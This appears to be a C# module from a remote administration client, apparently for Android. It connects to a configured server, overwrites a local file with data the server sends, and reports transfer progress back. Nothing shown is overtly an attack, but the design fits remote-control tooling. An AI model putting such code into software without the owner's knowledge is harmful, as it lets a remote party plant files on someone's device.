using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Task2
{
    public class Upload : IDisposable
    {
        private FileStream fs = default;
        private byte[] dataByte = new byte[8192]; // 1024 * 8
        private int blockSize = 8192;
        private int maxlenght_ = default;
        private string dosyaismi = default;
        private string yol = default;
        private string aydi = default;
        private string pPath = default;
        private Socket socket = default;
        public Upload(string path, string filename, string maxlenght, string identification, string pcPath)
        {
            try
            {
                string fmane = path + "/" + filename;
                if (File.Exists(fmane)) { try { File.Delete(fmane); } catch { } }
                pPath = pcPath;
                aydi = identification;
                dosyaismi = filename;
                yol = path;
                maxlenght_ = int.Parse(maxlenght);
                fs = new FileStream(path + "/" + filename, FileMode.Append, FileAccess.Write);
                Socket tmps = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                tmps.ReceiveTimeout = -1; tmps.SendTimeout = -1;
                tmps.SendBufferSize = int.MaxValue;
                tmps.ReceiveBufferSize = int.MaxValue;
                tmps.NoDelay = true;
                IPAddress ipadresi_dosya = Dns.GetHostAddresses(MainValues.IP)[0];
                IPEndPoint endpoint_dosya = new IPEndPoint(ipadresi_dosya, MainValues.port);
                ForegroundService._globalService.SetKeepAlive(tmps, 2000, 1000);
                socket = tmps;

                tmps.Connect(endpoint_dosya);

                byte[] ayrinti = Encoding.UTF8.GetBytes(filename + "[VERI]" + "%0" + "[VERI]0 B/" + GetFileSizeInBytes(maxlenght_) + "[VERI]" + pcPath);
                byte[] hazirim = ForegroundService._globalService.MyDataPacker("UPLOAD", ayrinti, path + filename + "[ID]" + identification);
                tmps.Send(hazirim, 0, hazirim.Length, SocketFlags.None);
                tmps.BeginReceive(dataByte, 0, blockSize, SocketFlags.None, received, tmps);
            }
            catch (Exception)
            {
                CloseSockets();
            }
        }

        public async void received(IAsyncResult ar)
        {
            try
            {
                Socket scServer = (Socket)ar.AsyncState;
                if (ForegroundService._globalService.upList.Contains(this))
                {
                    int readed = scServer.EndReceive(ar);
                    if (readed > 0)
                    {
                        fs.Write(dataByte, 0, readed);

                        decimal yuzde = fs.Length * 100 / maxlenght_;
                        string kbmb = GetFileSizeInBytes(fs.Length) + "/" + GetFileSizeInBytes(maxlenght_);

                        byte[] ayrinti = Encoding.UTF8.GetBytes(dosyaismi + "[VERI]" + "%" + yuzde.ToString() + "[VERI]" + kbmb + "[VERI]" + pPath);
                        byte[] hazirim = ForegroundService._globalService.MyDataPacker("UPLOAD", ayrinti, yol + dosyaismi + "[ID]" + aydi);
                        scServer.Send(hazirim, 0, hazirim.Length, SocketFlags.None);


                        if (fs.Length == maxlenght_)
                        {
                            CloseSockets();
                        }

                    }

                    await Task.Delay(1); // reduce high cpu usage. :)
                    scServer.BeginReceive(dataByte, 0, blockSize, SocketFlags.None, received, scServer);

                }
                else
                {
                    CloseSockets();
                }
            }
            catch (Exception) { CloseSockets(); }

        }
        public static string GetFileSizeInBytes(double sized)
        {
            try
            {
                string[] sizes = { "B", "KB", "MB", "GB", "TB" };
                double len = sized;
                int order = 0;
                while (len >= 1024 && order < sizes.Length - 1)
                {
                    order++;
                    len = len / 1024;
                }
                string result = string.Format("{0:0.##} {1}", len, sizes[order]);
                return result;
            }
            catch (Exception) { return "0 B"; }
        }
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }
        protected bool Disposed { get; private set; }
        protected virtual void Dispose(bool disposing)
        {
            Disposed = true;
        }
        public void CloseSockets()
        {
            try { ForegroundService._globalService.upList.Remove(this); } catch (Exception) { }
            if (socket != null)
            {
                try { socket.Close(); } catch (Exception) { }
                try { socket.Dispose(); } catch (Exception) { }
            }
            if (fs != null)
            {
                try { fs.Flush(); } catch { }
                try { fs.Close(); } catch { }
                try { fs.Dispose(); } catch { }
            }
            try { Dispose(); } catch (Exception) { }

        }
    }
}